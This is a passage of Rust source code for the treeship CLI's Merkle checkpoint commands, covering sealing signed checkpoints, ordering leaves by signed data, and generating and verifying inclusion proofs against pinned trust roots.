use std::{fs, path::PathBuf};

use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use ed25519_dalek::{Signer, SigningKey};
use rand::RngCore;
use sha2::{Digest, Sha256};
use std::time::{SystemTime, UNIX_EPOCH};
use treeship_core::merkle::{
    ArtifactSummary, Checkpoint, CheckpointVerifyOutcome, MerkleTree, ProofFile,
};

use crate::{ctx, printer::Printer};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Returns the merkle directory: ~/.treeship/merkle/
fn merkle_dir() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let home = home::home_dir().ok_or("cannot determine home directory")?;
    let dir = home.join(".treeship").join("merkle");
    crate::safe_fs::create_dir_all_nofollow(&dir)?;
    Ok(dir)
}

/// Returns the checkpoints directory: ~/.treeship/merkle/checkpoints/
fn checkpoints_dir() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let dir = merkle_dir()?.join("checkpoints");
    crate::safe_fs::create_dir_all_nofollow(&dir)?;
    Ok(dir)
}

/// Returns the directory holding each checkpoint's recorded leaf order:
/// ~/.treeship/merkle/checkpoints/leaves/
fn leaves_dir() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let dir = checkpoints_dir()?.join("leaves");
    crate::safe_fs::create_dir_all_nofollow(&dir)?;
    Ok(dir)
}

/// The facts a leaf's position is derived from, all read from inside the
/// signed DSSE payload: never from `index.json`, which is an unsigned cache
/// anyone with write access to the store can edit.
#[derive(Debug, Clone)]
struct LeafFacts {
    id: String,
    /// The chain parent the statement signs (`parentId`, or the edge
    /// `verify::signed_parent` derives for older statement kinds).
    parent: Option<String>,
    /// The statement's own signed time, in unix seconds.
    time: Option<u64>,
}

/// Decode the signed statement inside a stored record.
fn signed_statement(record: &treeship_core::storage::Record) -> Option<serde_json::Value> {
    let bytes = record.envelope.payload_bytes().ok()?;
    serde_json::from_slice(&bytes).ok()
}

/// The signed time a statement carries. Statement kinds name it
/// differently; all of them are inside the payload.
fn signed_time(statement: &serde_json::Value) -> Option<u64> {
    ["timestamp", "created_at", "issued_at", "signed_at"]
        .iter()
        .find_map(|k| statement.get(*k).and_then(|v| v.as_str()))
        .and_then(crate::validate::parse_rfc3339)
}

fn leaf_facts(ctx: &ctx::Ctx, id: &str) -> LeafFacts {
    let statement = ctx.storage.read(id).ok().and_then(|r| signed_statement(&r));
    let parent = statement
        .as_ref()
        .and_then(|s| match treeship_core::verify::signed_parent(s) {
            treeship_core::verify::SignedParent::Named(p) => Some(p),
            _ => None,
        });
    LeafFacts {
        id: id.to_string(),
        parent,
        time: statement.as_ref().and_then(signed_time),
    }
}

/// Order leaves from signed data only: a parent before its children (chain
/// order), then by signed time, then by artifact id. A leaf whose signed
/// time cannot be read sorts after every leaf whose time can. The result
/// depends on nothing an operator can change without breaking a signature.
fn order_by_signed_facts(facts: Vec<LeafFacts>) -> Vec<String> {
    use std::cmp::Reverse;
    use std::collections::{BinaryHeap, HashMap};

    type Key = (bool, u64, String);
    let key = |f: &LeafFacts| -> Key { (f.time.is_none(), f.time.unwrap_or(0), f.id.clone()) };

    let mut facts = facts;
    facts.sort_by(|a, b| a.id.cmp(&b.id));
    facts.dedup_by(|a, b| a.id == b.id);
    let pos: HashMap<String, usize> = facts
        .iter()
        .enumerate()
        .map(|(i, f)| (f.id.clone(), i))
        .collect();

    let mut children: Vec<Vec<usize>> = vec![Vec::new(); facts.len()];
    let mut waiting = vec![false; facts.len()];
    for (i, f) in facts.iter().enumerate() {
        if let Some(&p) = f.parent.as_ref().and_then(|p| pos.get(p)) {
            if p != i {
                children[p].push(i);
                waiting[i] = true;
            }
        }
    }

    let mut ready: BinaryHeap<Reverse<(Key, usize)>> = facts
        .iter()
        .enumerate()
        .filter(|(i, _)| !waiting[*i])
        .map(|(i, f)| Reverse((key(f), i)))
        .collect();
    let mut placed = vec![false; facts.len()];
    let mut out = Vec::with_capacity(facts.len());
    while let Some(Reverse((_, i))) = ready.pop() {
        placed[i] = true;
        out.push(facts[i].id.clone());
        for &c in &children[i] {
            ready.push(Reverse((key(&facts[c]), c)));
        }
    }
    // A parent cycle cannot come from content-addressed ids, but a store is
    // input: whatever is left goes last, in key order, rather than vanishing.
    let mut rest: Vec<&LeafFacts> = facts
        .iter()
        .enumerate()
        .filter(|(i, _)| !placed[*i])
        .map(|(_, f)| f)
        .collect();
    rest.sort_by_key(|f| key(f));
    out.extend(rest.into_iter().map(|f| f.id.clone()));
    out
}

/// Every artifact in the store, in signed order.
fn signed_order(ctx: &ctx::Ctx) -> Vec<String> {
    let facts = ctx
        .storage
        .list()
        .iter()
        .map(|e| leaf_facts(ctx, &e.id))
        .collect();
    order_by_signed_facts(facts)
}

/// The order older checkpoints were sealed in: `index.json`'s unsigned
/// `signed_at`. Kept ONLY to rebuild those checkpoints' trees for
/// proofs; a candidate order is accepted only when it reproduces the root
/// the checkpoint signs, so editing the index cannot move a leaf.
fn legacy_index_order(ctx: &ctx::Ctx) -> Vec<String> {
    let mut entries = ctx.storage.list();
    entries.reverse();
    entries.sort_by(|a, b| a.signed_at.cmp(&b.signed_at));
    entries.into_iter().map(|e| e.id).collect()
}

fn tree_of(ids: &[String]) -> MerkleTree {
    let mut tree = MerkleTree::new();
    for id in ids {
        tree.append(id);
    }
    tree
}

/// Build the tree the next checkpoint seals.
///
/// The latest checkpoint's leaves stay where they are (a log only appends,
/// and the consistency proof between the two checkpoints depends on it);
/// artifacts it does not cover follow in signed order. With no usable
/// previous checkpoint, the whole store is in signed order.
pub(crate) fn build_tree(
    ctx: &ctx::Ctx,
) -> Result<(MerkleTree, Vec<String>), Box<dyn std::error::Error>> {
    let signed = signed_order(ctx);
    let mut ids = match load_latest_checkpoint()
        .ok()
        .flatten()
        .and_then(|prev| checkpoint_leaves(ctx, &prev).ok())
    {
        Some((_, prefix)) => prefix,
        None => Vec::new(),
    };
    let covered: std::collections::HashSet<String> = ids.iter().cloned().collect();
    ids.extend(signed.into_iter().filter(|id| !covered.contains(id)));
    Ok((tree_of(&ids), ids))
}

/// The leaves `checkpoint` covers, in its order, with the tree they form.
///
/// Candidates, each accepted only if it reproduces the signed root: the leaf
/// order recorded when the checkpoint was sealed; the signed order of the
/// store; the index order older checkpoints were sealed in. The root is the authority,
/// so none of these unsigned sources can place a leaf the signer did not.
pub(crate) fn checkpoint_leaves(
    ctx: &ctx::Ctx,
    checkpoint: &Checkpoint,
) -> Result<(MerkleTree, Vec<String>), Box<dyn std::error::Error>> {
    let k = checkpoint.tree_size;
    let mut candidates: Vec<Vec<String>> = Vec::new();
    if let Some(recorded) = load_recorded_leaves(checkpoint) {
        candidates.push(recorded);
    }
    for order in [signed_order(ctx), legacy_index_order(ctx)] {
        if order.len() >= k {
            candidates.push(order[..k].to_vec());
        }
    }
    let mut first_err = None;
    for ids in candidates {
        match checkpoint_tree(&ids, checkpoint) {
            Ok(tree) => return Ok((tree, ids)),
            Err(e) => {
                first_err.get_or_insert(e);
            }
        }
    }
    let held = ctx.storage.list().len();
    if held < k {
        return Err(format!(
            "local store has {} artifacts but checkpoint #{} covers {} — the store no longer matches the checkpoint",
            held, checkpoint.index, k
        )
        .into());
    }
    Err(first_err.unwrap_or_else(|| {
        format!(
            "local artifacts no longer reproduce checkpoint #{}'s root (artifacts changed since checkpointing)\n\n  Fix: treeship checkpoint  (then re-run this command)",
            checkpoint.index
        )
        .into()
    }))
}

/// The leaf order written beside a checkpoint when it was sealed. Unsigned,
/// so only ever a candidate that `checkpoint_tree` checks against the root.
fn load_recorded_leaves(checkpoint: &Checkpoint) -> Option<Vec<String>> {
    let path = leaves_dir()
        .ok()?
        .join(format!("{:04}.json", checkpoint.index));
    let doc: serde_json::Value = serde_json::from_slice(&fs::read(path).ok()?).ok()?;
    if doc.get("root").and_then(|v| v.as_str()) != Some(checkpoint.root.as_str()) {
        return None;
    }
    let ids: Vec<String> = serde_json::from_value(doc.get("leaves")?.clone()).ok()?;
    (ids.len() == checkpoint.tree_size).then_some(ids)
}

/// Find the next checkpoint index by scanning existing checkpoints.
fn next_checkpoint_index() -> Result<u64, Box<dyn std::error::Error>> {
    let dir = checkpoints_dir()?;
    let mut max_index: u64 = 0;
    if let Ok(entries) = fs::read_dir(&dir) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if name == "latest.json" {
                continue;
            }
            if let Some(stem) = name.strip_suffix(".json") {
                if let Ok(idx) = stem.parse::<u64>() {
                    if idx > max_index {
                        max_index = idx;
                    }
                }
            }
        }
    }
    Ok(max_index + 1)
}

/// Load the latest checkpoint from disk.
pub(crate) fn load_latest_checkpoint() -> Result<Option<Checkpoint>, Box<dyn std::error::Error>> {
    let path = checkpoints_dir()?.join("latest.json");
    if !path.exists() {
        return Ok(None);
    }
    let bytes = fs::read(&path)?;
    let cp: Checkpoint = serde_json::from_slice(&bytes)?;
    Ok(Some(cp))
}

/// Count existing checkpoints.
fn count_checkpoints() -> Result<usize, Box<dyn std::error::Error>> {
    let dir = checkpoints_dir()?;
    let mut count = 0;
    if let Ok(entries) = fs::read_dir(&dir) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if name != "latest.json" && name.ends_with(".json") {
                count += 1;
            }
        }
    }
    Ok(count)
}

/// Shorten a hash for display: first 16 hex chars + "..."
fn short_hash(h: &str) -> String {
    let raw = h.strip_prefix("sha256:").unwrap_or(h);
    if raw.len() > 16 {
        format!("{}...", &raw[..16])
    } else {
        raw.to_string()
    }
}

/// A checkpoint covers the complete local tree, including artifacts the
/// operator deliberately kept local. The Hub rejects proofs for those
/// artifacts because it has no corresponding artifact row. That is an
/// expected local-only case, not a reason to abort proofs for artifacts that
/// were published.
fn is_missing_hub_artifact(status: u16, body: &serde_json::Value) -> bool {
    status == 404 && body.get("error").and_then(|v| v.as_str()) == Some("artifact not found")
}

// ---------------------------------------------------------------------------
// treeship checkpoint
// ---------------------------------------------------------------------------

pub fn checkpoint(
    config: Option<&str>,
    printer: &Printer,
) -> Result<(), Box<dyn std::error::Error>> {
    checkpoint_with(config, false, printer)
}

/// `treeship checkpoint --publish`: seal, then push to the attached hub in
/// the same command. A failed push is a failure (nonzero exit); the
/// checkpoint itself is still on disk.
pub fn checkpoint_with(
    config: Option<&str>,
    publish_after: bool,
    printer: &Printer,
) -> Result<(), Box<dyn std::error::Error>> {
    let sealed = seal_checkpoint(config, printer)?;
    let json = printer.format == crate::printer::Format::Json;
    if !json {
        print_sealed(&sealed, printer);
    }
    let published = if publish_after {
        Some(publish_report(config, printer))
    } else {
        None
    };
    if json {
        // One document, whatever was asked for: the checkpoint, and the
        // publish result under `publish` when --publish ran. In 0.31.10 the
        // JSON was identical with or without --publish, so a caller could
        // not tell from the document that anything reached the hub. A failed
        // publish is reported in the same document: the checkpoint is
        // sealed, and a retry must not seal a second one for nothing.
        let mut doc = sealed.to_json();
        match &published {
            Some(Ok(report)) => doc["publish"] = report.to_json(),
            Some(Err(e)) => {
                doc["publish"] = serde_json::json!({
                    "status": "failed",
                    "ok": false,
                    "error": e.to_string(),
                })
            }
            None => {}
        }
        printer.json(&doc);
    } else if let Some(Ok(report)) = &published {
        print_published(report, printer);
    }
    match published {
        Some(Err(e)) => Err(e),
        _ => Ok(()),
    }
}

/// What a verified inclusion proof says about time.
///
/// A checkpoint's `signed_at` comes from the signer's own clock, signed with
/// the signer's own key. Whoever holds that key can re-cut the log and sign
/// a new checkpoint with any time, so on its own a checkpoint bounds nothing.
/// Only a root witnessed by someone else (`anchor`, already verified by the
/// caller) supports "before this time". Nothing in the CLI anchors or checks
/// an anchor for a checkpoint root today, so every caller passes `None`.
fn time_statement(checkpoint: &Checkpoint, anchor: Option<&str>) -> Vec<String> {
    match anchor {
        Some(witness) => vec![
            format!(
                "  This artifact was in the log before {} ({}).",
                checkpoint.signed_at, witness
            ),
            "  It cannot have been inserted or backdated after this time.".to_string(),
        ],
        None => vec![
            format!(
                "  This checkpoint was signed by {} at its own claimed time, {}.",
                checkpoint.signer, checkpoint.signed_at
            ),
            "  No external anchor for this root was checked, so the time is the signer's claim: whoever holds that key can sign another checkpoint over a different log.".to_string(),
        ],
    }
}

/// What `checkpoint` sealed, for the text and JSON views.
struct Sealed {
    cp: Checkpoint,
    file: PathBuf,
}

impl Sealed {
    fn to_json(&self) -> serde_json::Value {
        // Full-length root and real numbers: the text view shortens the
        // root for the eye, but a script needs the whole hash.
        serde_json::json!({
            "status": "ok",
            "index": self.cp.index,
            "root": self.cp.root,
            "tree_size": self.cp.tree_size,
            "height": self.cp.height,
            "signer": self.cp.signer,
            "signed_at": self.cp.signed_at,
            "file": self.file,
        })
    }
}

fn print_sealed(sealed: &Sealed, printer: &Printer) {
    let cp = &sealed.cp;
    let root_short = short_hash(&cp.root);
    printer.success(
        "checkpoint sealed",
        &[
            ("index", &format!("#{:04}", cp.index)),
            ("root", &format!("sha256:{}", root_short)),
            ("artifacts", &cp.tree_size.to_string()),
            ("height", &cp.height.to_string()),
            ("signed", &format!("{}  (ed25519)", cp.signer)),
            ("time", &cp.signed_at),
        ],
    );
    printer.blank();
    printer.hint("treeship merkle proof <artifact_id>");
    // The whole root: a hint that truncates it hands the reader an argument
    // `merkle verify` rejects.
    printer.hint(&format!("treeship merkle verify {} <proof.json>", cp.root));
}

fn seal_checkpoint(
    config: Option<&str>,
    printer: &Printer,
) -> Result<Sealed, Box<dyn std::error::Error>> {
    let _ = printer;
    let ctx = ctx::open(config)?;
    let (tree, artifact_ids) = build_tree(&ctx)?;

    if tree.is_empty() {
        return Err("no artifacts to checkpoint -- create some artifacts first".into());
    }

    let index = next_checkpoint_index()?;
    let signer = ctx.keys.default_signer()?;
    let cp = Checkpoint::create(index, &tree, signer.as_ref())
        .map_err(|e| format!("checkpoint creation failed: {}", e))?;

    // Save checkpoint file: NNNN.json
    let cp_dir = checkpoints_dir()?;
    let filename = format!("{:04}.json", index);
    let cp_json = serde_json::to_vec_pretty(&cp)?;
    crate::safe_fs::write_under_treeship(&cp_dir.join(&filename), &cp_json, 0o600)?;

    // Record the leaf order beside it, so later proofs rebuild exactly this
    // tree. Unsigned: a reader accepts it only if it reproduces the root.
    let leaves_json = serde_json::to_vec_pretty(&serde_json::json!({
        "index": cp.index,
        "root": cp.root,
        "leaves": artifact_ids,
    }))?;
    crate::safe_fs::write_under_treeship(&leaves_dir()?.join(&filename), &leaves_json, 0o600)?;

    // Save latest.json (copy, not symlink, for portability)
    crate::safe_fs::write_under_treeship(&cp_dir.join("latest.json"), &cp_json, 0o600)?;

    Ok(Sealed {
        cp,
        file: cp_dir.join(&filename),
    })
}

/// The human summary a proof file carries, read from the signed statement:
/// who acted and what they did. Display only — a verifier checks inclusion
/// of the artifact id, never this summary.
fn artifact_summary(record: &treeship_core::storage::Record) -> ArtifactSummary {
    let statement = signed_statement(record).unwrap_or(serde_json::Value::Null);
    let field = |keys: &[&str]| {
        keys.iter()
            .find_map(|k| statement.get(*k).and_then(|v| v.as_str()))
            .map(str::to_string)
    };
    let short_type = record
        .payload_type
        .strip_prefix("application/vnd.treeship.")
        .and_then(|s| s.strip_suffix(".v1+json"))
        .unwrap_or(&record.payload_type)
        .to_string();
    // Each statement kind names its signer role differently.
    let actor = field(&["actor", "approver", "from", "endorser", "system", "issuer"])
        .unwrap_or_else(|| "unknown".to_string());
    // An action names itself; other kinds are described by their kind.
    let action = field(&["action"]).unwrap_or(short_type);
    let timestamp = field(&["timestamp", "created_at", "issued_at", "signed_at"])
        .unwrap_or_else(|| record.signed_at.clone());
    ArtifactSummary {
        actor,
        action,
        timestamp,
        key_id: record.key_id.clone(),
    }
}

// ---------------------------------------------------------------------------
// treeship merkle proof <artifact_id>
// ---------------------------------------------------------------------------

/// Rebuild the Merkle tree EXACTLY as it was at `checkpoint` — its first
/// `tree_size` leaves — and cross-check the rebuilt root against the
/// checkpoint's own root before returning it. Inclusion proofs must be
/// generated from THIS tree, never the full current one: an authentication
/// path is a function of the total leaf count, so a proof computed over a
/// tree that grew after the checkpoint reconstructs the wrong root and
/// reports a legitimate, in-log artifact as inclusion INVALID. (The same
/// correctness rule publish_consistency and `present` already apply.)
pub(crate) fn checkpoint_tree(
    artifact_ids: &[String],
    checkpoint: &Checkpoint,
) -> Result<MerkleTree, Box<dyn std::error::Error>> {
    if artifact_ids.len() < checkpoint.tree_size {
        return Err(format!(
            "local store has {} artifacts but checkpoint #{} covers {} — the store no longer matches the checkpoint",
            artifact_ids.len(), checkpoint.index, checkpoint.tree_size
        )
        .into());
    }
    let mut tree = MerkleTree::new();
    for id in &artifact_ids[..checkpoint.tree_size] {
        tree.append(id);
    }
    let computed = tree
        .root()
        .map(hex::encode)
        .ok_or("checkpoint-sized tree has no root")?;
    let cp_root = checkpoint
        .root
        .strip_prefix("sha256:")
        .unwrap_or(&checkpoint.root);
    if computed != cp_root {
        return Err(format!(
            "local artifacts no longer reproduce checkpoint #{}'s root (artifacts changed since checkpointing)\n\n  Fix: treeship checkpoint  (then re-run this command)",
            checkpoint.index
        )
        .into());
    }
    Ok(tree)
}

pub fn proof(
    artifact_id: &str,
    config: Option<&str>,
    printer: &Printer,
) -> Result<(), Box<dyn std::error::Error>> {
    let ctx = ctx::open(config)?;

    // Load the checkpoint FIRST: a proof is a statement about membership in
    // a signed checkpoint, so both the membership guard and the tree the
    // authentication path is computed from must be the checkpoint's.
    let checkpoint = load_latest_checkpoint()?
        .ok_or("no checkpoints found -- run 'treeship checkpoint' first")?;

    if !ctx.storage.exists(artifact_id) {
        return Err(format!("artifact {} not found in store", artifact_id).into());
    }

    // The checkpoint's own leaves, in its order, root-checked.
    let (cp_tree, cp_leaves) = checkpoint_leaves(&ctx, &checkpoint)?;

    // Membership guard: an artifact the checkpoint does not cover is not in
    // its tree — a "proof" against that checkpoint would be one that
    // verifiably fails.
    let leaf_index = cp_leaves
        .iter()
        .position(|id| id == artifact_id)
        .ok_or_else(|| {
            format!(
                "artifact {} is newer than checkpoint #{} (tree_size {})\n\n  Fix: treeship checkpoint  (then re-run this command)",
                artifact_id, checkpoint.index, checkpoint.tree_size
            )
        })?;

    let inclusion_proof = cp_tree
        .inclusion_proof(leaf_index)
        .ok_or("failed to generate inclusion proof")?;

    let record = ctx.storage.read(artifact_id)?;
    let proof_file = ProofFile {
        artifact_id: artifact_id.to_string(),
        artifact_summary: artifact_summary(&record),
        inclusion_proof: inclusion_proof.clone(),
        checkpoint: checkpoint.clone(),
    };

    // Save proof file
    let proof_json = serde_json::to_vec_pretty(&proof_file)?;
    let out_path = format!("{}.proof.json", artifact_id);
    crate::safe_fs::write_user_path(std::path::Path::new(&out_path), &proof_json)?;

    if printer.format == crate::printer::Format::Json {
        printer.json(&serde_json::json!({
            "status": "ok",
            "artifact_id": artifact_id,
            "leaf_index": leaf_index,
            "tree_size": checkpoint.tree_size,
            "leaf_hash": inclusion_proof.leaf_hash,
            "root": checkpoint.root,
            "checkpoint_index": checkpoint.index,
            "path_len": inclusion_proof.path.len(),
            "file": out_path,
        }));
        return Ok(());
    }

    let root_short = short_hash(&checkpoint.root);

    printer.success(
        &format!("inclusion proof  {}", artifact_id),
        &[
            (
                "leaf",
                &format!(
                    "sha256:{}  (position {} of {})",
                    short_hash(&inclusion_proof.leaf_hash),
                    leaf_index,
                    checkpoint.tree_size
                ),
            ),
            ("root", &format!("sha256:{}", root_short)),
            ("path", &format!("{} steps", inclusion_proof.path.len())),
            // Machine consumers need the generated proof file, not merely a
            // human summary. Without this field `--format json` hid the path
            // required by the subsequent `merkle verify` command.
            ("file", &out_path),
        ],
    );
    printer.blank();

    for (i, step) in inclusion_proof.path.iter().enumerate() {
        let dir_str = match step.direction {
            treeship_core::merkle::Direction::Left => "left ",
            treeship_core::merkle::Direction::Right => "right",
        };
        printer.info(&format!(
            "  Step {}:  {}  sha256:{}",
            i + 1,
            dir_str,
            short_hash(&step.hash)
        ));
    }
    printer.blank();

    printer.info(&format!(
        "checkpoint:  #{:04}  .  local  .  {}",
        checkpoint.index, checkpoint.signed_at
    ));
    printer.info(&format!("exported:    {}", out_path));
    printer.blank();
    printer.hint(&format!(
        "treeship merkle verify sha256:{}... {}",
        root_short, out_path
    ));

    Ok(())
}

// ---------------------------------------------------------------------------
// treeship merkle verify [root] <proof.json>
// ---------------------------------------------------------------------------

pub fn verify(
    expected_root: Option<&str>,
    proof_path: &str,
    printer: &Printer,
) -> Result<(), Box<dyn std::error::Error>> {
    let bytes = fs::read(proof_path).map_err(|e| format!("cannot read {}: {}", proof_path, e))?;
    let proof_file: ProofFile =
        serde_json::from_slice(&bytes).map_err(|e| format!("invalid proof JSON: {}", e))?;

    // 1. Verify checkpoint signature against pinned trust roots.
    //    The signature now also binds merkle_version (see
    //    Checkpoint::canonical_for_signing), so any tampered version
    //    on the checkpoint reaches us as an invalid signature.
    //
    //    Missing trust file = empty store, which makes verification
    //    fail closed (audit lane J: a checkpoint signed by an unpinned
    //    issuer is no longer accepted just because the signature math
    //    is internally consistent). Audit lane J fix-up: propagate
    //    Malformed / PermissionsTooOpen instead of silently degrading
    //    to an empty store.
    let trust = treeship_core::trust::TrustRootStore::open_default_or_empty().map_err(
        |e| -> Box<dyn std::error::Error> {
            printer.failure(
                "trust store unreadable",
                &[
                    (
                        "path",
                        &treeship_core::trust::TrustRootStore::default_path()
                            .display()
                            .to_string(),
                    ),
                    ("reason", &e.to_string()),
                ],
            );
            format!("trust-root: {e}").into()
        },
    )?;
    // `verify_detailed` keeps apart what `verify` collapses to `false`: a
    // signature that does not hold, and a valid signature from a signer this
    // machine has not pinned. The second is a trust decision, not tampering,
    // and it is exactly what a ship's own fresh checkpoint looks like before
    // its key is pinned as `hub_checkpoint` (CLI-5).
    let outcome = proof_file.checkpoint.verify_detailed(&trust);
    let sig_valid = outcome == CheckpointVerifyOutcome::Valid;
    let unpinned_key = match &outcome {
        CheckpointVerifyOutcome::SignerNotPinned { public_key } => Some(public_key.clone()),
        _ => None,
    };

    // 2. Verify inclusion proof. The trusted merkle_version is the one
    // bound into the checkpoint signature, NOT the one in the proof
    // blob. verify_proof additionally rejects on per-proof drift.
    let root_hex = proof_file
        .checkpoint
        .root
        .strip_prefix("sha256:")
        .unwrap_or(&proof_file.checkpoint.root);

    let proof_valid = MerkleTree::verify_proof(
        proof_file.checkpoint.merkle_version,
        root_hex,
        &proof_file.artifact_id,
        &proof_file.inclusion_proof,
    );

    // 3. If expected root provided, check it matches
    let root_matches = match expected_root {
        Some(expected) => {
            let expected_hex = expected.strip_prefix("sha256:").unwrap_or(expected);
            expected_hex == root_hex
        }
        None => true,
    };

    let all_valid = sig_valid && proof_valid && root_matches;

    if all_valid {
        let root_short = short_hash(&proof_file.checkpoint.root);
        // No external anchor for a checkpoint root is checked here, so the
        // time below is the signer's own claim (see `time_statement`).
        let anchor: Option<&str> = None;
        printer.success(
            "inclusion verified  (offline)",
            &[
                ("anchor", anchor.unwrap_or("none")),
                ("artifact", &proof_file.artifact_id),
                (
                    "position",
                    &format!(
                        "{} of {}",
                        proof_file.inclusion_proof.leaf_index, proof_file.checkpoint.tree_size
                    ),
                ),
                ("root", &format!("sha256:{}  matches", root_short)),
                (
                    "path",
                    &format!("{} steps, all valid", proof_file.inclusion_proof.path.len()),
                ),
            ],
        );
        printer.blank();

        // Print step-by-step verification, dispatching on the proof's
        // declared merkle version so v2 uses 0x01-prefixed internal
        // hashing (RFC 9162). v1 (legacy) skips the prefix to remain
        // byte-identical to v0.10.2-and-earlier output.
        let version = proof_file.inclusion_proof.merkle_version;
        let mut current_hex = proof_file.inclusion_proof.leaf_hash.clone();
        for (i, step) in proof_file.inclusion_proof.path.iter().enumerate() {
            let sibling_short = short_hash(&step.hash);
            let current_short = short_hash(&current_hex);

            // Recompute next hash
            let current_bytes = hex::decode(&current_hex).unwrap_or_default();
            let sibling_bytes = hex::decode(&step.hash).unwrap_or_default();
            let mut hasher = Sha256::new();
            if version == treeship_core::merkle::MERKLE_VERSION_V2 {
                hasher.update([0x01u8]);
            }
            match step.direction {
                treeship_core::merkle::Direction::Right => {
                    hasher.update(&current_bytes);
                    hasher.update(&sibling_bytes);
                }
                treeship_core::merkle::Direction::Left => {
                    hasher.update(&sibling_bytes);
                    hasher.update(&current_bytes);
                }
            }
            let result: [u8; 32] = hasher.finalize().into();
            let result_hex = hex::encode(result);
            let result_short = short_hash(&result_hex);

            let dir_str = match step.direction {
                treeship_core::merkle::Direction::Right => {
                    format!("sha256:{} + sha256:{}", current_short, sibling_short)
                }
                treeship_core::merkle::Direction::Left => {
                    format!("sha256:{} + sha256:{}", sibling_short, current_short)
                }
            };

            let check = printer.green("ok");
            printer.info(&format!(
                "  Step {}:  {} -> sha256:{}  {}",
                i + 1,
                dir_str,
                result_short,
                check
            ));

            current_hex = result_hex;
        }
        printer.blank();

        printer.info(&format!(
            "  checkpoint: #{:04}  .  {}",
            proof_file.checkpoint.index, proof_file.checkpoint.signed_at
        ));
        printer.info(&format!(
            "  signed by:  {}  {}",
            proof_file.checkpoint.signer,
            printer.green("ok")
        ));
        printer.blank();
        for line in time_statement(&proof_file.checkpoint, anchor) {
            printer.info(&line);
        }
    } else if let (Some(public_key), true, true) = (&unpinned_key, proof_valid, root_matches) {
        // Everything holds except the trust decision. The key comes from the
        // checkpoint itself, so the pin line is not a copy-paste that trusts
        // it blindly: no `--yes`, and the reader confirms the key elsewhere.
        let key_id = &proof_file.checkpoint.signer;
        let detail = pin_advice(key_id, public_key);
        if printer.format == crate::printer::Format::Json {
            printer.json(&serde_json::json!({
                "outcome": "not_pinned",
                "artifact": proof_file.artifact_id,
                "key_id": key_id,
                "public_key": public_key,
                "inclusion_proof": "valid",
                "detail": detail,
            }));
        } else {
            printer.failure(
                "checkpoint signer not pinned",
                &[
                    ("artifact", &proof_file.artifact_id),
                    ("signature", "valid"),
                    ("inclusion", "valid"),
                    ("detail", &detail),
                ],
            );
        }
        return Err(crate::exit::not_pinned(format!(
            "checkpoint signer {key_id:?} not pinned"
        )));
    } else {
        let mut reasons = Vec::new();
        match &outcome {
            CheckpointVerifyOutcome::Valid => {}
            CheckpointVerifyOutcome::SignerNotPinned { .. } => {
                reasons.push("checkpoint signer not pinned".to_string())
            }
            CheckpointVerifyOutcome::Invalid { reason } => {
                reasons.push(format!("checkpoint signature invalid ({reason})"))
            }
        }
        if !proof_valid {
            reasons.push("inclusion proof invalid".to_string());
        }
        if !root_matches {
            reasons.push("root hash does not match expected".to_string());
        }
        printer.failure(
            "verification failed",
            &[
                ("artifact", &proof_file.artifact_id),
                ("reason", &reasons.join(", ")),
            ],
        );
        return Err("verification failed".into());
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// treeship merkle status
// ---------------------------------------------------------------------------

pub fn status(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn std::error::Error>> {
    let ctx = ctx::open(config)?;
    let total_artifacts = ctx.storage.list().len();
    let num_checkpoints = count_checkpoints()?;
    let latest_cp = load_latest_checkpoint()?;

    if printer.format == crate::printer::Format::Json {
        let latest = latest_cp.as_ref().map(|cp| {
            serde_json::json!({
                "index": cp.index,
                "root": cp.root,
                "tree_size": cp.tree_size,
                "height": cp.height,
                "signed_at": cp.signed_at,
                "signer": cp.signer,
            })
        });
        printer.json(&serde_json::json!({
            "total_artifacts": total_artifacts,
            "checkpoints": num_checkpoints,
            "latest": latest,
            "uncheckpointed": latest_cp
                .as_ref()
                .map(|cp| total_artifacts.saturating_sub(cp.tree_size))
                .unwrap_or(total_artifacts),
        }));
        return Ok(());
    }

    printer.blank();
    printer.section("Local Merkle tree");

    printer.info(&format!("  total artifacts:   {}", total_artifacts));
    printer.info(&format!("  checkpoints:       {}", num_checkpoints));

    if let Some(ref cp) = latest_cp {
        printer.info(&format!(
            "  latest:            #{:04}  .  {}",
            cp.index, cp.signed_at
        ));
        printer.info(&format!(
            "  latest root:       sha256:{}",
            short_hash(&cp.root)
        ));

        let uncheckpointed = total_artifacts.saturating_sub(cp.tree_size);
        printer.info(&format!(
            "  uncheckpointed:    {} artifacts",
            uncheckpointed
        ));
    } else {
        printer.dim_info("  no checkpoints yet");
    }
    printer.blank();

    if latest_cp.is_none() && total_artifacts > 0 {
        printer.hint("treeship checkpoint");
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// treeship merkle publish
// ---------------------------------------------------------------------------

/// What `merkle publish` did, for the text and JSON views.
pub(crate) struct PublishReport {
    index: u64,
    root: String,
    hub_checkpoint_id: i64,
    proofs_published: u64,
    local_only: u64,
    consistency: Consistency,
    share_url: Option<String>,
}

/// The consistency proof from the previous checkpoint: published, or why
/// not. Never a failure of the publish itself.
enum Consistency {
    Published {
        from_index: u64,
        from_size: usize,
        to_size: usize,
    },
    NotApplicable(&'static str),
    Failed(String),
}

impl PublishReport {
    fn to_json(&self) -> serde_json::Value {
        let consistency = match &self.consistency {
            Consistency::Published {
                from_index,
                from_size,
                to_size,
            } => serde_json::json!({
                "status": "published",
                "from_index": from_index,
                "from_size": from_size,
                "to_size": to_size,
            }),
            Consistency::NotApplicable(why) => {
                serde_json::json!({"status": "not_applicable", "reason": why})
            }
            Consistency::Failed(e) => serde_json::json!({"status": "failed", "error": e}),
        };
        serde_json::json!({
            "status": "ok",
            "index": self.index,
            "root": self.root,
            "hub_checkpoint_id": self.hub_checkpoint_id,
            "proofs_published": self.proofs_published,
            "local_only": self.local_only,
            "consistency": consistency,
            "share_url": self.share_url,
        })
    }
}

fn print_published(report: &PublishReport, printer: &Printer) {
    printer.info(&format!(
        "  {} {} proofs published",
        printer.green("ok"),
        report.proofs_published
    ));
    if report.local_only > 0 {
        printer.hint(&format!(
            "{} local-only artifacts skipped (push them first if their proofs should be public)",
            report.local_only
        ));
    }
